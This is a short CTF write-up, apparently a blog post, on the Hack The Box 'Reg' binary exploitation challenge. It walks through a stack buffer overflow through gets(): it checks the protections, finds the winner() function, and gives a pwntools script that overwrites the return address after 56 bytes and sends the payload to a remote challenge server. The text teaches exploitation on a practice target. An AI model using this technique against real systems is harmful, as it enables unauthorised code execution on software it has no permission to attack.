---

title: HTB [REG] [PWN]

date: 2022-06-03 07:28:05 +0200

categories: [pwn,htb]

tags: [Intro to Binary Exploitation]

---

## Reg

**Description:**

> This is a basic buffer flow exploit. Try to get the flag.


**Analysis:**

```css
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- Here NX enabled so we can't execute our shellcode here
- Let's decompile this binary

![](https://i.imgur.com/OEHHGlO.png)
- Main function calls this `run()` function
- This just gets input from us and prints `Registered!`
- `gets()` is a vulnerable function, we can able to do buffer overflow here
- Let's search for some useful functions


**win function:**

![](https://i.imgur.com/3T8zi7P.png)
- There's a function called `winner()`
- It gives us the flag
- So the goal is to jump to this function
- Now let's write our exploit


**Exploitation part:**
- RIP occurs in 56th position
- So let's fill junk for 56 bytes and put the winner function address next

**Exploit script:**
```python
from pwn import *

elf = context.binary = ELF("./reg")
p = remote('138.68.188.223',31041)

payload = b'A'*56
payload += p64(elf.sym['winner'])

p.sendline(payload)
p.interactive()
```

![](https://i.imgur.com/OCJqGCR.png)
- Cool it worked !!
